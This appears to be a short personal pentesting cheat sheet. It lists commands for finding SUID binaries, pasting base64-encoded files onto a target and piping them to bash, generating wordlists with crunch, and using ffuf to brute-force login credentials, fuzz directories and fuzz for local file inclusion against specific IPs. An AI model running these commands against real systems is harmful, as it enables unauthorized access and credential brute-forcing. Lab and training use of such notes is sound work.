# FunThings
Funthings

## SUID 

```
find / -type f -perm -04000 -ls 2>/dev/null
```


## Get response (bash) 

```
echo -n "Enter a Username: " && head -1 </dev/s| tr -d "\n"
```


## Quick transfer shells + encoded (copy and paste to target)

Easy Binary or file transfer

```
#Encode file
cat file | base64 -w500 | xclip -sel o

#Go to target and press SHIFT+INSERT after entering command line below

cat<<EOF >filename.b64
#SHIFT+INSERT NOW
EOF

#Decode file or run straight
cat file.b64 | base64 -d > file.sh
cat file.b64 | base64 -d | bash
```

### Example

test.sh
```
#!/bin/bash
echo "Testing Works"
```

```
cat test.sh | base64 -w500 | xclip -sel o

cat <<EOF > testing.b64                  
heredoc> IyEvYmluL2Jhc2gKZWNobyAiVEVTVElORyIK                               # << Pressing "SHIFT" + "INSERT" here                 
heredoc> EOF

cat testing.b64 | base64 -d | bash
Testing Works
```


## Crunch

```
crunch 8 8 -t k1ll0r@@ --stdout
crunch 8 8 -t k1ll0r@@ -f charset.lst mixalpha-numeric
```


## Ffuf

### post login

```
ffuf -u "http://34.94.3.143/7b4c1c34db/secure-login/"  -d "username=FUZZ&password=a" -w "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt" -fr "Invalid Username" -H 'Content-Type: application/x-www-form-urlencoded'

ffuf -u "http://34.94.3.143/7b4c1c34db/secure-login/"  -d "username=access&password=FUZZ" -w "/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt" -fr "Invalid Password" -H 'Content-Type: application/x-www-form-urlencoded'

```

### Dir Fuzz

```
ffuf -u http://10.10.11.135/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   -i -ic -mc all  -t 80 -fc 404,403 -e .php,.html,.txt -c
```


### LFI FUZZ

Fuzz 2 point (LFI example, img,file,path(WW1), filepath(WW2))

```
ffuf -u http://10.10.11.135/image.php?WW1=WW2 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:WW1,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt:WW2   -i -ic -mc all  -t 80  -c -fc 404,403,301
```

```
ffuf -u http://10.10.11.135/image.php?img=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt   -i -ic -mc all  -t 80  -c -fc 404,403,301
```
